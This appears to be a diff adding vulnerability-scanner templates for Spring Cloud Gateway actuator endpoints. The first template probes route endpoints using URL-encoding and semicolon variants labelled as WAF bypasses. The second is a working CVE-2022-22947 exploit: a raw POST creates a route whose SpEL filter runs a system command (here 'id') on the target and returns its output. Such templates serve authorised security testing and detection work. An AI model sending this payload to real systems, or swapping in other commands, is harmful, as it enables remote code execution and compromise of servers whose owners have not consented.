@@ -1,0 +1,163 @@
+id: springboot-gateway-ssrf
+
+info:
+  name: Spring Boot Gateway Actuator - SSRF & Route Manipulation
+  author: Shafranpackeer
+  severity: high
+  description: |
+    Detects exposed Spring Cloud Gateway actuator endpoints that allow SSRF by design.
+    When /gateway/routes is writable, attackers can:
+    - Route traffic to internal services
+    - Access cloud metadata endpoints (169.254.169.254)
+    - Intercept traffic by re-routing active paths
+    - Achieve RCE via CVE-2022-22947 (SpEL injection) on older versions
+
+    Spring Cloud Gateway < 3.1.0 / 3.0.6 is vulnerable to remote code execution
+    via malicious SpEL expressions in route definitions.
+  reference:
+    - https://wya.pl/2021/12/20/bring-your-own-ssrf-the-gateway-actuator/
+    - https://blog.viettelcybersecurity.com/cve-2022-22947-spring-cloud-gateway-code-injection-vulnerability/
+    - https://www.wiz.io/blog/spring-boot-actuator-misconfigurations
+    - https://github.com/twseptian/cve-2022-22947
+  metadata:
+    max-request: 20
+    verified: true
+  tags: springboot,gateway,ssrf,rce,cve,cve2022,cve-2022-22947
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10.0
+    cwe-id: CWE-918,CWE-94
+
+http:
+  - method: GET
+    path:
+      # ============================================
+      # GATEWAY ROUTES DISCOVERY
+      # ============================================
+      - "{{BaseURL}}/actuator/gateway/routes"
+      - "{{BaseURL}}/gateway/routes"
+      - "{{BaseURL}}/actuator/gateway"
+      - "{{BaseURL}}/gateway/actuator/routes"
+
+      # ============================================
+      # WAF BYPASS - URL ENCODING
+      # ============================================
+      - "{{BaseURL}}/actuator/gateway/routes%23"
+      - "{{BaseURL}}/%61ctuator/gateway/routes"
+      - "{{BaseURL}}/actuator/%67ateway/routes"
+      - "{{BaseURL}}/actuator/g%61teway/routes"
+      - "{{BaseURL}}/actuator/gateway/%72outes"
+
+      # ============================================
+      # SEMICOLON BYPASS
+      # ============================================
+      - "{{BaseURL}}/actuator;/gateway/routes"
+      - "{{BaseURL}}/gateway;/routes"
+      - "{{BaseURL}}/;/actuator/gateway/routes"
+
+      # ============================================
+      # ALTERNATE PATHS
+      # ============================================
+      - "{{BaseURL}}/manage/gateway/routes"
+      - "{{BaseURL}}/management/gateway/routes"
+      - "{{BaseURL}}/api/actuator/gateway/routes"
+      - "{{BaseURL}}/internal/gateway/routes"
+
+      # ============================================
+      # GLOBAL FILTERS (CVE-2022-22947 indicator)
+      # ============================================
+      - "{{BaseURL}}/actuator/gateway/globalfilters"
+      - "{{BaseURL}}/actuator/gateway/routefilters"
+
+    stop-at-first-match: true
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "predicate"
+          - "route_id"
+          - "route_definition"
+          - "filters"
+          - "RouteDefinition"
+        condition: or
+
+      - type: word
+        part: header
+        words:
+          - "application/json"
+
+      - type: status
+        status:
+          - 200
+
+    extractors:
+      - type: regex
+        part: body
+        name: route-ids
+        regex:
+          - '"route_id"\s*:\s*"([^"]+)"'
+        group: 1
+
+      - type: regex
+        part: body
+        name: uris
+        regex:
+          - '"uri"\s*:\s*"([^"]+)"'
+        group: 1
+
+---
+id: springboot-gateway-rce-cve-2022-22947
+
+info:
+  name: Spring Cloud Gateway RCE - CVE-2022-22947
+  author: Shafranpackeer
+  severity: critical
+  description: |
+    Spring Cloud Gateway versions prior to 3.1.1+ and 3.0.7+ are vulnerable to
+    remote code execution via SpEL expression injection when the Gateway Actuator
+    endpoint is enabled and exposed without authentication.
+  reference:
+    - https://nvd.nist.gov/vuln/detail/CVE-2022-22947
+    - https://tanzu.vmware.com/security/cve-2022-22947
+    - https://github.com/twseptian/cve-2022-22947
+  metadata:
+    max-request: 2
+    verified: true
+  tags: springboot,gateway,rce,cve,cve2022,cve-2022-22947,critical,intrusive
+
+http:
+  # Step 1: Create malicious route with SpEL injection
+  - raw:
+      - |
+        POST /actuator/gateway/routes/hacktest HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {
+          "id": "hacktest",
+          "filters": [{
+            "name": "AddResponseHeader",
+            "args": {
+              "name": "Result",
+              "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"
+            }
+          }],
+          "uri": "http://example.com",
+          "order": 0
+        }
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 201
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "hacktest"
+          - "true"
+        condition: or
